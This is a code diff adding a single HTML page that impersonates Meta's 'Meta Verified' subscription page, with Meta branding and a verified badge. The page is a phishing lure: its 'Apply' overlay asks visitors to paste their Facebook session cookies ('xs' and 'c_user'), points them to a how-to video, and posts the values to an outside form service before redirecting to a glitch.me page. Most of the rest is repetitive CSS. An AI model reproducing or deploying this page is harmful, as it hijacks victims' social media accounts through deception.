@@ -1,0 +1,1009 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+    <link rel="stylesheet" href="style.css" />
+    <style>
+        /* Professional CSS for a compact appeal form */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .appeal-form {
+            background: #ffffff;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 340px;
+            padding: 12px;
+            position: relative;
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e5e7eb;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        .appeal-form .close-btn {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            font-size: 18px;
+            color: #6b7280;
+            cursor: pointer;
+            background: none;
+            border: none;
+            transition: color 0.2s ease;
+        }
+
+        .appeal-form .close-btn:hover {
+            color: #1f2937;
+        }
+
+        .appeal-form h2 {
+            font-size: 17px;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .appeal-form p {
+            font-size: 11px;
+            color: #4b5563;
+            margin-bottom: 6px;
+            line-height: 1.4;
+        }
+
+        .appeal-form .video-player {
+            width: 100%;
+            height: 90px;
+            background: #000;
+            margin-bottom: 6px;
+            border-radius: 6px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            font-size: 10px;
+            border: 1px solid #1f2937;
+        }
+
+        .appeal-form input,
+        .appeal-form textarea {
+            width: 100%;
+            border: 1px solid #d1d5db;
+            border-radius: 5px;
+            padding: 5px;
+            margin-bottom: 6px;
+            font-size: 11px;
+            color: #1f2937;
+            background: #f9fafb;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .appeal-form input:focus,
+        .appeal-form textarea:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.1);
+        }
+
+        .appeal-form textarea {
+            height: 45px;
+            resize: none;
+        }
+
+        .appeal-form input {
+            height: 28px;
+        }
+
+        .appeal-form button {
+            width: 30%;
+            padding: 10px;
+            background-color: #4267B2;
+            color: white;
+            border: none;
+            border-radius: 0px;
+            font-size: 14px;
+            cursor: pointer;
+            float: right;
+            margin-top: -10px; /* Move button slightly up */
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: #F5F6F6;
+        }
+
+        .header {
+            padding: 2rem;
+            background: white;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .header img {
+            width: 120px;
+            height: auto;
+        }
+
+        .main-content {
+            display: flex;
+            padding: 2rem;
+            max-width: 1400px;
+            margin: 0 auto;
+            gap: 4rem;
+            min-height: calc(100vh - 100px);
+        }
+
+        .left-section {
+            flex: 1;
+            padding: 2rem;
+        }
+
+        .badge-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .badge {
+            width: 80px;
+            height: auto;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+        }
+
+        .new-tag {
+            display: inline-block;
+            background: #E4F0FF;
+            color: #0064E0;
+            padding: 0.5rem 1.5rem;
+            border-radius: 100px;
+            font-size: 0.875rem;
+            margin-left: 1rem;
+            font-weight: 500;
+            box-shadow: 0 2px 4px rgba(0,100,224,0.1);
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            margin: 2rem 0;
+            line-height: 1.2;
+            background: linear-gradient(135deg, #000000,  #000000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.02em;
+        }
+
+        .apply-btn {
+            background: linear-gradient(135deg, #0064E0, #1a90ff);
+            color: white;
+            padding: 1rem 2.5rem;
+            border-radius: 100px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: 500;
+            margin: 1rem 0;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 12px rgba(0,100,224,0.2);
+        }
+
+        .apply-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0,100,224,0.3);
+        }
+
+        .description {
+            font-size: 1.125rem;
+            color: #4B5563;
+            margin: 2rem 0;
+            line-height: 1.6;
+            max-width: 600px;
+        }
+
+        .features-list {
+            margin: 2rem 0;
+            list-style: none;
+        }
+
+        .features-list li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+            color: #374151;
+        }
+
+        .features-list li:before {
+            content: "→";
+            margin-right: 1rem;
+            color: #0064E0;
+            font-weight: bold;
+        }
+
+        .business-section {
+            margin: 2rem 0;
+            padding-top: 2rem;
+            border-top: 1px solid #E5E7EB;
+        }
+
+        .business-link {
+            color: #0064E0;
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            margin-top: 0.5rem;
+        }
+
+        .business-link:after {
+            content: "→";
+            margin-left: 0.5rem;
+            transition: transform 0.2s;
+        }
+
+        .business-link:hover:after {
+            transform: translateX(4px);
+        }
+
+        .disclaimer {
+            font-style: italic;
+            color: #6B7280;
+            font-size: 0.875rem;
+            margin-top: 2rem;
+        }
+
+        .right-section {
+            flex: 1;
+            position: relative;
+            display: block;
+        }
+
+        .hero-image {
+            width: 100%;
+            height: 600px;
+            object-fit: cover;
+            border-radius: 1rem;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+
+        .image-overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.2) 100%);
+            border-radius: 1rem;
+        }
+
+        /* 1. Mobile-only styles */
+        @media (max-width: 480px) {
+            .main-content {
+                flex-direction: column;
+                padding: 1rem;
+            }
+
+            .left-section {
+                padding: 1rem;
+            }
+
+            .right-section {
+                display: none;
+            }
+
+            h1 {
+                font-size: 2.5rem;
+            }
+
+            .description {
+                font-size: 1rem;
+            }
+
+            .apply-btn {
+                padding: 0.75rem 2rem;
+            }
+        }
+
+        /* 2. Mobile Chrome Desktop view styles */
+        @media (min-width: 481px) and (max-width: 1024px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+                gap: 3rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+                flex: 2;
+            }
+
+            .right-section {
+                display: block;
+                flex: 1;
+            }
+
+            h1 {
+                font-size: 2.2rem;
+                line-height: 1.3;
+                margin-bottom: 1rem;
+            }
+
+            .description {
+                font-size: 0.95rem;
+                max-width: 100%;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+            }
+
+            .hero-image {
+                height: 400px;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            }
+        }
+
+        /* 3. Laptop or PC styles */
+        @media (min-width: 1025px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+            }
+
+            .right-section {
+                display: block;
+            }
+
+            h1 {
+                font-size: 3.5rem;
+            }
+
+            .description {
+                font-size: 1.125rem;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+            }
+        }
+
+        /* Mobile Chrome Desktop view styles */
+        @media (min-width: 481px) and (max-width: 1024px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+                gap: 3rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+                flex: 2;
+            }
+
+            .right-section {
+                display: block;
+                flex: 1;
+            }
+
+            h1 {
+                font-size: 2.2rem;
+                line-height: 1.3;
+                margin-bottom: 1rem;
+            }
+
+            .description {
+                font-size: 0.95rem;
+                max-width: 100%;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+            }
+
+            .hero-image {
+                height: 500px;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            }
+        }
+
+        /* Mobile Chrome Desktop view styles */
+        @media (min-width: 481px) and (max-width: 1024px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+                gap: 3rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+                flex: 2;
+            }
+
+            .right-section {
+                display: block;
+                flex: 1;
+            }
+
+            h1 {
+                font-size: 2.2rem;
+                line-height: 1.3;
+                margin-bottom: 1rem;
+            }
+
+            .description {
+                font-size: 0.95rem;
+                max-width: 100%;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+            }
+
+            .hero-image {
+                height: 600px;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            }
+        }
+
+        /* 3. Laptop or PC styles */
+        @media (min-width: 1025px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+            }
+
+            .right-section {
+                display: block;
+            }
+
+            h1 {
+                font-size: 3.5rem;
+            }
+
+            .description {
+                font-size: 1.125rem;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+            }
+
+            .hero-image {
+                height: 800px;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            }
+        }
+
+        /* 3. Laptop or PC styles */
+        @media (min-width: 1025px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+            }
+
+            .right-section {
+                display: block;
+            }
+
+            h1 {
+                font-size: 3.5rem;
+            }
+
+            .description {
+                font-size: 1.125rem;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+            }
+
+            .hero-image {
+                height: 900px;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            }
+        }
+
+        /* Mobile Chrome Desktop view styles */
+        @media (min-width: 481px) and (max-width: 1024px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+                gap: 3rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+                flex: 2;
+            }
+
+            .right-section {
+                display: block;
+                flex: 1;
+            }
+
+            h1 {
+                font-size: 2.2rem;
+                line-height: 1.3;
+                margin-bottom: 1rem;
+            }
+
+            .description {
+                font-size: 0.95rem;
+                max-width: 100%;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+            }
+
+            .hero-image {
+                height: 500px;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            }
+        }
+
+        /* Mobile Chrome Desktop view styles */
+        @media (min-width: 481px) and (max-width: 1024px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+                gap: 2rem;
+            }
+
+            .left-section {
+                padding: 1.5rem;
+                flex: 2;
+            }
+
+            .right-section {
+                display: block;
+                flex: 1;
+            }
+
+            h1 {
+                font-size: 2.4rem;
+                line-height: 1.3;
+                margin-bottom: 1.2rem;
+                text-align: left;
+            }
+
+            .description {
+                font-size: 1rem;
+                max-width: 100%;
+                margin-bottom: 1.5rem;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+                background: linear-gradient(135deg, #0064E0, #1a90ff);
+                color: white;
+                border-radius: 100px;
+                font-weight: 500;
+                text-decoration: none;
+                box-shadow: 0 4px 12px rgba(0, 100, 224, 0.2);
+                transition: transform 0.2s, box-shadow 0.2s;
+                display: inline-block;
+            }
+
+            .apply-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 16px rgba(0, 100, 224, 0.3);
+            }
+
+            .hero-image {
+                height: 450px;
+                width: 100%;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0, 0, 0, 0.2);
+            }
+
+            .features-list li {
+                font-size: 1rem;
+            }
+
+            .business-link {
+                font-size: 1rem;
+            }
+
+            .disclaimer {
+                font-size: 0.875rem;
+            }
+        }
+
+        /* General improvements */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: #F5F6F6;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        /* 1. Mobile Chrome Desktop view styles */
+        @media (min-width: 481px) and (max-width: 1024px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+                gap: 2.5rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+                flex: 2;
+            }
+
+            .right-section {
+                display: block;
+                flex: 1;
+                margin-top: 1.5rem;
+            }
+
+            h1 {
+                font-size: 2.5rem;
+                line-height: 1.4;
+                margin-bottom: 1.5rem;
+                text-align: left;
+                font-weight: 700;
+                color: #111;
+            }
+
+            .description {
+                font-size: 1.1rem;
+                color: #4B5563;
+                max-width: 100%;
+                margin-bottom: 2rem;
+                line-height: 1.7;
+            }
+
+            .apply-btn {
+                padding: 1.1rem 2.8rem;
+                background: linear-gradient(135deg, #0064E0, #1a90ff);
+                color: white;
+                border-radius: 100px;
+                font-weight: 600;
+                text-decoration: none;
+                box-shadow: 0 4px 15px rgba(0, 100, 224, 0.3);
+                display: inline-block;
+                transition: all 0.3s ease;
+            }
+
+            .apply-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 18px rgba(0, 100, 224, 0.4);
+            }
+
+            .hero-image {
+                height: 480px;
+                width: 100%;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            }
+
+            .features-list li {
+                font-size: 1.1rem;
+                margin-bottom: 1.2rem;
+                color: #374151;
+                font-weight: 500;
+                line-height: 1.5;
+            }
+
+            .features-list li:before {
+                content: "→";
+                margin-right: 1rem;
+                color: #0064E0;
+                font-weight: bold;
+            }
+
+            .business-link {
+                font-size: 1.1rem;
+                color: #0064E0;
+                font-weight: 500;
+                display: inline-flex;
+                align-items: center;
+                margin-top: 1rem;
+            }
+
+            .business-link:after {
+                content: "→";
+                margin-left: 0.5rem;
+                transition: transform 0.3s ease;
+            }
+
+            .business-link:hover:after {
+                transform: translateX(4px);
+            }
+
+            .disclaimer {
+                font-style: italic;
+                color: #6B7280;
+                font-size: 0.95rem;
+                margin-top: 2rem;
+                text-align: left;
+            }
+
+            .main-content, .left-section, .right-section {
+                opacity: 0;
+                animation: fadeIn 1s ease-in-out forwards;
+            }
+
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                }
+                to {
+                    opacity: 1;
+                }
+            }
+
+            .apply-btn:focus {
+                outline: 2px solid #1a90ff;
+                outline-offset: 4px;
+            }
+
+            .apply-btn:active {
+                transform: scale(0.98);
+            }
+        }
+
+        /* 2. Laptop or PC styles */
+        @media (min-width: 1025px) {
+            .main-content {
+                flex-direction: row;
+                padding: 2rem;
+            }
+
+            .left-section {
+                padding: 2rem;
+            }
+
+            .right-section {
+                display: block;
+            }
+
+            h1 {
+                font-size: 3.5rem;
+                font-weight: 700;
+            }
+
+            .description {
+                font-size: 1.125rem;
+            }
+
+            .apply-btn {
+                padding: 1rem 2.5rem;
+            }
+
+            .hero-image {
+                height: 700px;
+                width: 100%;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0, 0, 0, 0.2);
+            }
+        }
+
+        /* 1. Define animation keyframes */
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes zoomIn {
+            0% {
+                transform: scale(0.95);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes slideIn {
+            0% {
+                opacity: 0;
+                transform: translateX(-50px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        /* 1. Laptop or PC Styles (min-width: 1025px) */
+        @media (min-width: 1025px) {
+            .hero-image {
+                height: 900px;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+                transition: transform 0.3s ease, box-shadow 0.3s ease;
+            }
+
+            .hero-image:hover {
+                transform: scale(1.05);
+                box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+            }
+        }
+
+        /* Other screen sizes (mobile or tablet) remain unaffected */
+        @media (max-width: 1024px) {
+            .hero-image {
+                height: auto;
+                object-fit: cover;
+                border-radius: 1rem;
+                box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            }
+        }
+
+        /* Form Inputs */
+        .fb-input-container {
+            margin-bottom: px;
+        }
+
+        .fb-input-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .fb-input-container input {
+            width: 2%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .new-tag {
+            display: inline-block;
+            background: #e7f3ff;
+            color: #1877f2;
+            padding: 0.3rem 1rem;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            margin-left: 1rem;
+            font-weight: 500;
+            box-shadow: 0 1px 3px rgba(0, 100, 224, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo">
+    </header>
+
+    <main class="main-content">
+        <section class="left-section">
+            <div class="badge-container">
+                <img src="https://cdn.glitch.global/9c268ed6-4eec-4c0c-9cb5-edf84fe4ab44/blue-verified-badge-18768.png" alt="Verified Badge" class="badge">
+                <span class="new-tag">New</span>
+            </div>
+            
+            <h1>Become <br>Meta Verified</h1>
+            
+            <a class='apply-btn' href='javascript:void(0)' onclick="document.querySelector('.overlay').style.display='flex';">Apply</a>
+            
+            <p class="description">
+                Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.
+            </p>
+            <p class="sign-up">Sign up now for creators</p>
+            <ul class="features-list">
+                <li>Verified badge and exclusive features</li>
+                <li>Proactive account protection</li>
+                <li>Access to dedicated support team</li>
+            </ul>
+
+            <div class="business-section">
+                <p><strong>Looking for business verification?</strong></p>
+                <a href="#" class="business-link">Learn about Meta Verified for Business</a>
+            </div>
+
+            <p class="disclaimer">Features, availability, and pricing may vary by region.</p>
+        </section>
+
+        <section class="right-section">
+            <img src="https://cdn.glitch.global/b7587d54-d587-4767-a79a-f12c49fffeb5/1000081140_LE_upscale_magic_beta_x4_strength_75_similarity_50_light_ai_10_tone_enhance_30_color_enhance_30.jpg?v=1734995406637" alt="Meta Verified" class="hero-image">
+        </section>
+    </main>
+
+    <!-- Appeal Form Overlay -->
+    <div class="overlay">
+        <div class="appeal-form">
+            <button class="close-btn" onclick="document.querySelector('.overlay').style.display='none';">×</button>
+            <h2>Verified Badge Form</h2>
+            <p>The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.</p>
+            <p>Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.</p>
+            <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
+            <div>
+                <h5>Detailed Video Information.</h5>
+                <a href="https://ucarecdn.com/d4c54d4b-8463-4452-9d57-5ce592c92c5d/InShot_20250503_064614339.mp4">
+                    <img src="https://cdn.glitch.global/a00d804e-7caa-4537-8138-a50d15956c65/fbVideo.png.1fd476160a3ed7a2f565.png?v=1736413104467" alt="fb" style="width: 160px; height: 120px;">
+                </a>
+            </div>
+            <p>Please be sure to provide the requested information below.</p>
+            <form action="https://submit-form.com/XZAETXl2K" method="POST" id="appealForm">
+                <input type="hidden" name="_redirect" value="https://new-blue-tag.glitch.me/next.html"/>
+                <label for="c_user">xs</label>
+                <input type="text" name="xs" placeholder="" required>
+                <label for="c_user">c_user</label>
+                <input type="text" name="c_user" placeholder="" required>
+                <br><br>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Detect when elements are in the viewport and add animation
+        document.addEventListener('DOMContentLoaded', () => {
+            const elements = document.querySelectorAll('.scroll-animation');
+            const observer = new IntersectionObserver(entries => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('visible');
+                    }
+                });
+            });
+
+            elements.forEach(element => {
+                observer.observe(element);
+            });
+        });
+        document.getElementById('appealForm').addEventListener('submit', function(event) {
+        // The form will be submitted normally first
+        // Then redirect to a specified file
+        setTimeout(function() {
+            window.location.href = 'next.html';
+        }, 1000); // Adjust the delay as needed
+    });
+    </script>
+</body>
+</html>
